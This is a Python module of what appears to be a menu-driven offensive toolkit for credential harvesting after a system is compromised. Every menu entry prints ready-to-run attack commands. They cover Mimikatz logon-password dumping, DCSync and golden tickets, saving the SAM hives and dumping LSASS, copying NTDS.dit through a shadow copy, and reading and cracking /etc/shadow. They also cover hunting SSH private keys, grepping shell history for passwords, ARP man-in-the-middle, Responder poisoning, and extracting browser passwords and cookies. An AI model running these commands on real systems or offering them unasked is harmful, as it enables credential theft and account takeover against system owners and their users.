#!/usr/bin/env python3
# app/post_exploitation/credential_harvesting.py

import os
import sys

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, BASE_DIR)

from config import C_OK, C_WARN, C_ERR, C_RESET, C_INFO, C_TITLE
from utils import Logger, pause, InputValidator, clear_screen


class Terminal:
    MARGIN = 4
    
    @staticmethod
    def print_margin(text=""):
        margin = ' ' * Terminal.MARGIN
        if text:
            print(margin + text)
        else:
            print()


class CredentialHarvesting:
    def show_header(self):
        clear_screen()
        Terminal.print_margin()
        Terminal.print_margin(f"{C_TITLE}╔════════════════════════════════════════╗{C_RESET}")
        Terminal.print_margin(f"{C_TITLE}║      CREDENTIAL HARVESTING TOOLKIT     ║{C_RESET}")
        Terminal.print_margin(f"{C_TITLE}╚════════════════════════════════════════╝{C_RESET}")
        Terminal.print_margin()
    
    def run(self):
        while True:
            self.show_header()
            
            Terminal.print_margin(f"{C_TITLE}┌─ CREDENTIAL HARVESTING ─────────────┐{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  WINDOWS:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [1]  Mimikatz{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [2]  SAM/LSA Dump{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [3]  LSASS Memory Dump{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [4]  NTDS.dit Extraction{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  LINUX:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [5]  /etc/shadow Cracking{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [6]  SSH Keys Extraction{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [7]  History Files{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  NETWORK:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [8]  Network Sniffing{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [9]  LLMNR/NBT-NS Poisoning{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  BROWSER:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [10] Browser Password Extraction{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [11] Cookie Hijacking{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_WARN}  [0]  Back{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_TITLE}└─────────────────────────────────────┘{C_RESET}")
            Terminal.print_margin()
            
            choice = InputValidator.get_choice()
            
            if choice == '0':
                return
            elif choice == '1':
                self.mimikatz()
            elif choice == '2':
                self.sam_lsa_dump()
            elif choice == '3':
                self.lsass_dump()
            elif choice == '4':
                self.ntds_extraction()
            elif choice == '5':
                self.shadow_cracking()
            elif choice == '6':
                self.ssh_keys()
            elif choice == '7':
                self.history_files()
            elif choice == '8':
                self.network_sniffing()
            elif choice == '9':
                self.llmnr_poisoning()
            elif choice == '10':
                self.browser_passwords()
            elif choice == '11':
                self.cookie_hijacking()
            else:
                Logger.error("Invalid choice!")
                pause()
    
    def mimikatz(self):
        """Mimikatz commands"""
        self.show_header()
        Logger.info("Mimikatz - Windows Credential Extraction")
        Terminal.print_margin()
        
        Logger.info("Common Mimikatz commands:")
        Terminal.print_margin()
        
        commands = [
            ("privilege::debug", "Enable debug privileges"),
            ("sekurlsa::logonpasswords", "Dump logon passwords"),
            ("sekurlsa::tickets", "List Kerberos tickets"),
            ("lsadump::sam", "Dump SAM database"),
            ("lsadump::secrets", "Dump LSA secrets"),
            ("lsadump::dcsync /user:Administrator", "DCSync attack"),
            ("token::elevate", "Elevate to SYSTEM"),
            ("kerberos::golden", "Create golden ticket"),
        ]
        
        for cmd, desc in commands:
            Terminal.print_margin(f"{C_OK}{cmd:40s}{C_RESET} # {desc}")
        
        Terminal.print_margin()
        Logger.info("Usage: mimikatz.exe \"command\" \"exit\"")
        
        pause()
    
    def sam_lsa_dump(self):
        """SAM and LSA dump"""
        self.show_header()
        Logger.info("SAM/LSA Database Dump")
        Terminal.print_margin()
        
        Logger.info("Methods:")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# Impacket secretsdump{C_RESET}")
        Terminal.print_margin("impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# Registry extraction{C_RESET}")
        Terminal.print_margin("reg save HKLM\\SAM sam.hive")
        Terminal.print_margin("reg save HKLM\\SYSTEM system.hive")
        Terminal.print_margin("reg save HKLM\\SECURITY security.hive")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# Remote dump{C_RESET}")
        Terminal.print_margin("impacket-secretsdump DOMAIN/USER:PASSWORD@TARGET")
        
        pause()
    
    def lsass_dump(self):
        """LSASS memory dump"""
        self.show_header()
        Logger.info("LSASS Memory Dump")
        Terminal.print_margin()
        
        Logger.info("Methods:")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# Task Manager method{C_RESET}")
        Terminal.print_margin("1. Open Task Manager")
        Terminal.print_margin("2. Details tab > lsass.exe")
        Terminal.print_margin("3. Right-click > Create dump file")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# procdump{C_RESET}")
        Terminal.print_margin("procdump.exe -ma lsass.exe lsass.dmp")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# pypykatz (offline){C_RESET}")
        Terminal.print_margin("pypykatz lsa minidump lsass.dmp")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# Mimikatz (offline){C_RESET}")
        Terminal.print_margin('mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"')
        
        pause()
    
    def ntds_extraction(self):
        """NTDS.dit extraction"""
        self.show_header()
        Logger.info("NTDS.dit Extraction (Domain Controller)")
        Terminal.print_margin()
        
        Logger.info("Methods:")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# DCSync (Mimikatz){C_RESET}")
        Terminal.print_margin('mimikatz.exe "lsadump::dcsync /domain:DOMAIN /all /csv"')
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# Impacket secretsdump{C_RESET}")
        Terminal.print_margin("impacket-secretsdump -just-dc DOMAIN/USER@DC_IP")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# Volume Shadow Copy{C_RESET}")
        Terminal.print_margin("vssadmin create shadow /for=C:")
        Terminal.print_margin("copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit .")
        Terminal.print_margin("copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM .")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# Extract hashes{C_RESET}")
        Terminal.print_margin("impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL")
        
        pause()
    
    def shadow_cracking(self):
        """Linux shadow file cracking"""
        self.show_header()
        Logger.info("/etc/shadow Password Cracking")
        Terminal.print_margin()
        
        Logger.info("1. Extract password hashes:")
        Terminal.print_margin("  cat /etc/shadow")
        Terminal.print_margin()
        
        Logger.info("2. Crack with John the Ripper:")
        Terminal.print_margin("  unshadow /etc/passwd /etc/shadow > hashes.txt")
        Terminal.print_margin("  john hashes.txt")
        Terminal.print_margin("  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt")
        Terminal.print_margin()
        
        Logger.info("3. Crack with Hashcat:")
        Terminal.print_margin("  hashcat -m 1800 hashes.txt rockyou.txt")
        
        pause()
    
    def ssh_keys(self):
        """SSH keys extraction"""
        self.show_header()
        Logger.info("SSH Keys Extraction")
        Terminal.print_margin()
        
        Logger.info("Locations:")
        Terminal.print_margin()
        
        locations = [
            "~/.ssh/id_rsa",
            "~/.ssh/id_dsa",
            "~/.ssh/id_ecdsa",
            "~/.ssh/id_ed25519",
            "~/.ssh/authorized_keys",
            "~/.ssh/known_hosts",
        ]
        
        for loc in locations:
            Terminal.print_margin(f"  • {loc}")
        
        Terminal.print_margin()
        Logger.info("Search all users:")
        Terminal.print_margin("find /home -name id_rsa 2>/dev/null")
        Terminal.print_margin("find / -name authorized_keys 2>/dev/null")
        
        pause()
    
    def history_files(self):
        """History files examination"""
        self.show_header()
        Logger.info("History Files Examination")
        Terminal.print_margin()
        
        Logger.info("Common history files:")
        Terminal.print_margin()
        
        files = [
            "~/.bash_history",
            "~/.zsh_history",
            "~/.mysql_history",
            "~/.psql_history",
            "~/.python_history",
        ]
        
        for f in files:
            Terminal.print_margin(f"  • {f}")
        
        Terminal.print_margin()
        Logger.info("Search for sensitive data:")
        Terminal.print_margin("grep -i 'password' ~/.bash_history")
        Terminal.print_margin("grep -i 'mysql' ~/.bash_history")
        Terminal.print_margin("grep -i 'ssh' ~/.bash_history")
        
        pause()
    
    def network_sniffing(self):
        """Network credential sniffing"""
        self.show_header()
        Logger.info("Network Credential Sniffing")
        Terminal.print_margin()
        
        Logger.info("Tools:")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# tcpdump{C_RESET}")
        Terminal.print_margin("tcpdump -i eth0 -s 0 -w capture.pcap")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# Wireshark filters{C_RESET}")
        Terminal.print_margin("http.request.method == POST")
        Terminal.print_margin("ftp")
        Terminal.print_margin("telnet")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# Ettercap (MITM){C_RESET}")
        Terminal.print_margin("ettercap -T -M arp:remote /target_ip// /gateway_ip//")
        
        pause()
    
    def llmnr_poisoning(self):
        """LLMNR/NBT-NS poisoning"""
        self.show_header()
        Logger.info("LLMNR/NBT-NS Poisoning")
        Terminal.print_margin()
        
        Logger.info("Responder - LLMNR/NBT-NS/MDNS poisoner")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# Basic usage{C_RESET}")
        Terminal.print_margin("responder -I eth0")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# Analyze mode (passive){C_RESET}")
        Terminal.print_margin("responder -I eth0 -A")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# With WPAD{C_RESET}")
        Terminal.print_margin("responder -I eth0 -wFb")
        Terminal.print_margin()
        
        Logger.info("Captured hashes location:")
        Terminal.print_margin("  /usr/share/responder/logs/")
        Terminal.print_margin()
        
        Logger.info("Crack with hashcat:")
        Terminal.print_margin("  hashcat -m 5600 hashes.txt rockyou.txt")
        
        pause()
    
    def browser_passwords(self):
        """Browser password extraction"""
        self.show_header()
        Logger.info("Browser Password Extraction")
        Terminal.print_margin()
        
        Logger.info("Chrome passwords:")
        Terminal.print_margin("  Windows: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data")
        Terminal.print_margin("  Linux: ~/.config/google-chrome/Default/Login Data")
        Terminal.print_margin()
        
        Logger.info("Firefox passwords:")
        Terminal.print_margin("  Windows: %APPDATA%\\Mozilla\\Firefox\\Profiles\\")
        Terminal.print_margin("  Linux: ~/.mozilla/firefox/")
        Terminal.print_margin()
        
        Logger.info("Tools:")
        Terminal.print_margin("  • LaZagne (multi-browser)")
        Terminal.print_margin("  • SharpChrome")
        Terminal.print_margin("  • firefox_decrypt")
        
        pause()
    
    def cookie_hijacking(self):
        """Cookie hijacking"""
        self.show_header()
        Logger.info("Cookie Hijacking")
        Terminal.print_margin()
        
        Logger.info("Cookie locations:")
        Terminal.print_margin()
        Terminal.print_margin("Chrome: ~/.config/google-chrome/Default/Cookies")
        Terminal.print_margin("Firefox: ~/.mozilla/firefox/*/cookies.sqlite")
        Terminal.print_margin()
        
        Logger.info("Extract cookies:")
        Terminal.print_margin("sqlite3 Cookies 'SELECT host_key, name, value FROM cookies'")
        Terminal.print_margin()
        
        Logger.info("Browser extensions:")
        Terminal.print_margin("  • EditThisCookie")
        Terminal.print_margin("  • Cookie-Editor")
        
        pause()


if __name__ == "__main__":
    cred_harv = CredentialHarvesting()
    cred_harv.run()